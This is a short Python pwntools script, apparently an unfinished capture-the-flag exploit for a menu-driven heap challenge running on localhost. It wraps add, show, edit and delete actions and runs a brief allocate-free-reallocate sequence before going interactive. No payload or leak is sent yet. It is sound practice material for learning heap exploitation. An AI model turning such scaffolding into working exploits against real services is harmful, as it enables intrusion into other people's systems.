#!/usr/bin/env python
from pwn import *

host = "127.0.0.1"
port = 9999
r = remote(host,port)
def add_pro(name,age,size,desc):
	r.recvuntil("Your choice :")
	r.sendline("1")
	r.recvuntil("Name :")
	r.sendline(name)
	r.recvuntil("Age :")
	r.sendline(str(age))
	r.recvuntil("Length of description :")
	r.sendline(str(size))
	r.recvuntil("Description :")
	r.sendline(desc)

def add_nomuch(name,age,size):
	r.recvuntil("Your choice :")
	r.sendline("1")
	r.recvuntil("Name :")
	r.sendline(name)
	r.recvuntil("Age :")
	r.sendline(str(age))
	r.recvuntil("Length of description :")
	r.sendline(str(size))

def show_pro(iid):
	r.recvuntil("choice :")
        r.sendline("2")
	r.recvuntil("ID :")
	r.sendline(str(iid))

def edit_pro(iid,name,age,desc):
	r.recvuntil("choice :")
        r.sendline("3")
	r.recvuntil("ID :")
	r.sendline(str(iid))
	r.recvuntil("Name :")
	r.sendline(name)
	r.recvuntil("Age :")
	r.sendline(str(age))
	r.recvuntil("Description :")
	r.sendline(desc)

def del_pro(iid):
	r.recvuntil("choice :")
        r.sendline("4")
	r.recvuntil("ID :")
	r.sendline(str(iid))

add_nomuch("ddaa",23,128)
add_pro("ddaa",23,160,"ddaa")   #0[name]  0[desc]
add_pro("ddaa",23,160,"ddaa")   #1[name]
del_pro(0)
add_nomuch("ddaa",23,128)
#add_pro("dddd",23,160,"dddd")
r.interactive()
